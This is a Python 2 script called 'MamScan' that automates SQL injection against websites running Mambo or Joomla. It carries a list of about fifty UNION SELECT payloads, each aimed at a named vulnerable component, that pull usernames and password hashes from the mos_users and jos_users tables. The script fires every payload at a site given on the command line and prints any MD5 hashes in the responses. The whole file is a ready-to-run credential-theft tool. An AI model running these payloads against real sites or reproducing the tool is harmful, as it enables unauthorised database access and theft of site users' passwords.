#!/usr/bin/python
#Mambo Component SQL scanner, checks source for md5's

#Uncomment line 44 for verbose mode. If md5 found
#check manually.

#http://www.darkc0de.com
#d3hydr8[at]gmail[dot]com

import sys, urllib2, re, time

print "\n\t   d3hydr8[at]gmail[dot]com MamScan v1.0"
print "\t------------------------------------------"

sqls = ["index.php?option=com_akogallery&Itemid=S@BUN&func=detail&id=-334455/**/union/**/select/**/null,null,concat(password,0x3a),null,null,null,nul  l,null,null,null,null,null,null,null,null,null,nul  l,null,null,null,concat(0x3a,username)/**/from/**/mos_users/*",
"index.php?option=com_catalogshop&Itemid=S@BUN&func=detail&id=-1/**/union/**/select/**/null,null,concat(password),3,4,5,6,7,8,9,10,11,12,  concat(username)/**/from/**/mos_users/*",
"index.php?option=com_restaurant&Itemid=S@BUN&func=detail&id=-1/**/union/**/select/**/0,0,password,0,0,0,0,0,0,0,0,0,username/**/from/**/mos_users/*",
"index.php?option=com_glossary&func=display&Itemid=s@bun&catid=-1%20union%20select%201,username,password,4,5,6,7,8  ,9,10,11,12,13,14%20from%20mos_users--",
"index.php?option=com_musepoes&task=answer&Itemid=s@bun&catid=s@bun&aid=-1/**/union/**/select/**/0,username,password,0x3a,0x3a,3,0,0x3a,0,4,4,4,0,0  x3a,0,5,5,5,0,0x3a/**/from/**/mos_users/*",
"index.php?option=com_recipes&Itemid=S@BUN&func=detail&id=-1/**/union/**/select/**/0,1,concat(username,0x3a,password),username,0x3a,5  ,6,7,8,9,10,11,12,0x3a,0x3a,0x3a,username,username  ,0x3a,0x3a,0x3a,21,0x3a/**/from/**/mos_users/*",
"index.php?option=com_jokes&Itemid=S@BUN&func=CatView&cat=-776655/**/union/**/select/**/0,1,2,3,username,5,password,7,8/**/from/**/mos_users/*",
"index.php?option=com_estateagent&Itemid=S@BUN&func=showObject&info=contact&objid=-9999/**/union/**/select/**/username,password/**/from/**/mos_users/*&results=S@BUN",
"index.php?option=com_newsletter&Itemid=S@BUN&listid=9999999/**/union/**/select/**/name,password/**/from/**/mos_users/*",
"index.php?option=com_fq&Itemid=S@BUN&listid=9999999/**/union/**/select/**/name,password/**/from/**/mos_users/*",
"index.php?option=com_mamml&listid=9999999/**/union/**/select/**/name,password/**/from/**/mos_users/*",
"index.php?option=com_neoreferences&Itemid=27&catid=99887766/**/union/**/select/**/concat(username,0x3a,password)/**/from/**/jos_users/*%20where%20user_id=1=1/*", "index.php?option=com_directory&page=viewcat&catid=-1/**/union/**/select/**/0,concat(username,0x3a,password)/**/from/**/jos_users/*",
"index.php?option=com_shambo2&Itemid=-999999%2F%2A%2A%2Funion%2F%2A%2A%2Fselect%2F%2A%2A  %2F0%2C1%2Cconcat(username,0x3a,password)%2C0%2C0%  2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2F  %2A%2A%2Ffrom%2F%2A%2A%2Fmos_users",
"index.php?option=com_awesom&Itemid=S@BUN&task=viewlist&listid=-1/**/union/**/select/**/null,concat(username,0x3a,password),null,null,null  ,null,null,null,null/**/from/**/mos_users/*",
"index.php?option=com_sermon&gid=-9999999%2F%2A%2A%2Funion%2F%2A%2A%2Fselect/**/concat(username,0x3a,password),0,0,username,passwo  rd%2C0%2C0%2C0/**/from/**/mos_users/*",
"index.php?option=com_neogallery&task=show&Itemid=5&catid=999999%2F%2A%2A%2Funion%2F%2A%2A%2Fselect/**/concat(username,0x3a,password),concat(username,0x3  a,password),concat(username,0x3a,password)/**/from%2F%2A%2A%2Fjos_users",
"index.php?option=com_gallery&Itemid=0&func=detail&id=-99999/**/union/**/select/**/0,0,password,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,use  rname/**/from/**/mos_users/*",
"index.php?option=com_gallery&Itemid=0&func=detail&id=-999999%2F%2A%2A%2Funion%2F%2A%2A%2Fselect%2F%2A%2A  %2F0%2C1%2Cpassword%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C  0%2C0%2C0%2Cusername%2F%2A%2A%2Ffrom%2F%2A%2A%2Fmo  s_users",
"index.php?option=com_rapidrecipe&user_id=-9999999/**/union/**/select/**/concat(username,0x3a,password)/**/from/**/jos_users/*",
"index.php?option=com_rapidrecipe&category_id=-9999999/**/union/**/select/**/concat(username,0x3a,password)/**/from/**/jos_users/*",
"index.php?option=com_pcchess&Itemid=S@BUN&page=players&user_id=-9999999/**/union/**/select/**/concat(username,0x3a,password)/**/from/**/jos_users/*",
"index.php?option=com_xfaq&task=answer&Itemid=S@BUN&catid=97&aid=-9988%2F%2A%2A%2Funion%2F%2A%2A%2Fselect/**/concat(username,0x3a,password),0x3a,password,0x3a,  username,0,0,0,0,1,1,1,1,1,1,1,1,0,0,0/**/from/**/jos_users/*",
"index.php?option=com_paxxgallery&Itemid=85&gid=7&userid=S@BUN&task=view&iid=-3333%2F%2A%2A%2Funion%2F%2A%2A%2Fselect%2F%2A%2A%2  F0%2C1%2C2%2C3%2Cconcat(username,0x3a,password)%2F  %2A%2A%2Ffrom%2F%2A%2A%2Fjos_users",
"index.php?option=com_mcquiz&task=user_tst_shw&Itemid=xxx&tid=1%2F%2A%2A%2Funion%2F%2A%2A%2Fselect/**/concat(username,0x3a,password),concat(username,0x3  a,password),0x3a/**/from/**/jos_users/*",
"index.php?option=com_mcquiz&task=user_tst_shw&Itemid=xxx&tid=1/**/union/**/select/**/0,concat(username,0x3a,password),concat(username,0  x3a,password)/**/from/**/mos_users/*",
"index.php?option=com_quiz&task=user_tst_shw&Itemid=xxx&tid=1/**/union/**/select/**/0,concat(username,0x3a,password),concat(username,0  x3a,password)/**/from/**/jos_users/*",
"index.php?option=com_quiz&task=user_tst_shw&Itemid=xxx&tid=1/**/union/**/select/**/0,concat(username,0x3a,password),concat(username,0  x3a,password)/**/from/**/mos_users/*",
"index.php?option=com_quran&action=viewayat&surano=-1+union+all+select+1,concat(username,0x3a,password   ),3,4,5+from+mos_users+limit+0,20--",
"index.php?option=com_quran&action=viewayat&surano=-1+union+all+select+1,concat(username,0x3a,password   ),3,4,5+from+jos_users+limit+0,20--",
"administrator/components/com_astatspro/refer.php?id=-1/**/union/**/select/**/0,concat(username,0x3a,password,0x3a,usertype),con  cat(username,0x3a,password,0x3a,usertype)/**/from/**/jos_users/*",
"index.php?option=com_portfolio&memberId=9&categoryId=-1+union+select+1,2,3,concat(username,0x3a,password  ),5,6,7,8,9,10,11,12+from+mos_users/*",
"index.php?option=com_pccookbook&page=viewuserrecipes&user_id=-9999999/**/union/**/select/**/concat(username,0x3a,password)/**/from/**/jos_users/*",
"index.php?option=com_clasifier&Itemid=S@BUN&cat_id=-9999999/**/union/**/select/**/concat(username,0x3a,password)/**/from/**/jos_users/*",
"index.php?option=com_hwdvideoshare&func=viewcategory&Itemid=S@BUN&cat_id=-9999999/**/union/**/select/**/000,111,222,username,password,0,0,0,0,0,0,0,0,0,0,  0,1,1,1,1,2,2,2/**/from/**/jos_users/*",
"index.php?option=com_simpleshop&Itemid=S@BUN&cmd=section&section=-000/**/union+select/**/000,111,222,concat(username,0x3a,password),0,conca  t(username,0x3a,password)/**/from/**/jos_users/*",
"index.php?option=com_garyscookbook&Itemid=S@BUN&func=detail&id=-666/**/union+select/**/0,0,password,0,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0  ,username+from%2F%2A%2A%2Fmos_users/*",
"index.php?option=com_simpleboard&func=view&catid=-999+union+select+2,2,3,concat(0x3a,0x3a,username,0  x3a,password),5+from+mos_users/*",
"index.php?option=com_musica&Itemid=172&tasko=viewo &task=view2&id=-4214/**/union+select/**/0,0,password,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0+fro   m%2F%2A%2A%2Fmos_users/*",
"index.php?option=com_candle&task=content&cID=-9999/**/union/**/select/**/0x3a,username,0x3a,password,0x3a,0x3a/**/from/**/jos_users/*",
"index.php?option=com_ewriting&Itemid=9999&func=selectcat&cat=-1+UNION+ALL+SELECT+1,2,concat(username,0x3a,passwo  rd),4,5,6,7,8,9,10+FROM+jos_users--",
"index.php?option=com_accombo&func=detail&Itemid=S@BUN&id=-99999/**/union/**/select/**/0,1,0x3a,3,4,5,6,7,8,9,10,11,12,concat(username,0x  3a,password)/**/from/**/mos_users/*",
"index.php?option=com_ahsshop&do=default&vara=-99999/**/union/**/select/**/0,concat(username,0x3a,password),0x3a,3,4,0x3a,6,0  x3a/**/from/**/mos_users/*",
"index.php?option=com_ahsshop&do=default&vara=-99999/**/union/**/select/**/concat(username,0x3a,password),1/**/from/**/mos_users/*",
"index.php?option=com_mambads&Itemid=45&func=view&ma_cat=99999%20union%20select%20concat(CHAR(60,117  ,115,101,114,62),username,CHAR(60,117,115,101,114,  62))from/**/mos_users/**",
"index.php?option=com_galleries&id=10&aid=-1%20union%20select%201,2,3,concat(CHAR(60,117,115,  101,114,62),username,CHAR(60,117,115,101,114,62))f  rom/**/mos_users/**",
"index.php?option=com_n-gallery&Itemid=29&sP=-1+union+select+1,2,concat(username,char(58),passwo  rd)KHG,4,5,6,7,8,9,10,11,12,13,14,15,16,17+from+mo  s_users/*",
"index.php?option=com_n-gallery&flokkur=-1+union+select+concat(username,char(58),password)K  HG+from+mos_users--"]

if len(sys.argv) != 2:
	print "\nUsage: ./mamscan.py <site>"
	print "Ex: ./mamscan.py www.test.com\n"
	sys.exit(1)

host = sys.argv[1].replace("/index.php", "")
if host[-1] != "/":
	host = host+"/"
if host[:7] != "http://":
	host = "http://"+host
	
print "\n[+] Site:",host
print "[+] SQL Loaded:",len(sqls) 

print "[+] Starting Scan...\n" 
for sql in sqls:
	time.sleep(3) #Change this if needed
	#print "[+] Trying:",host+sql.replace("\n","")
	try:
		source = urllib2.urlopen(host+sql.replace("\n","")).read()
		md5s = re.findall("[a-f0-9]"*32,source)
		if len(md5s) >= 1:
			print "[!]",host+sql.replace("\n","")
			for md5 in md5s:
				print "\n[+]MD5:",md5
	except(urllib2.HTTPError):
		pass
print "\n[-] Done\n"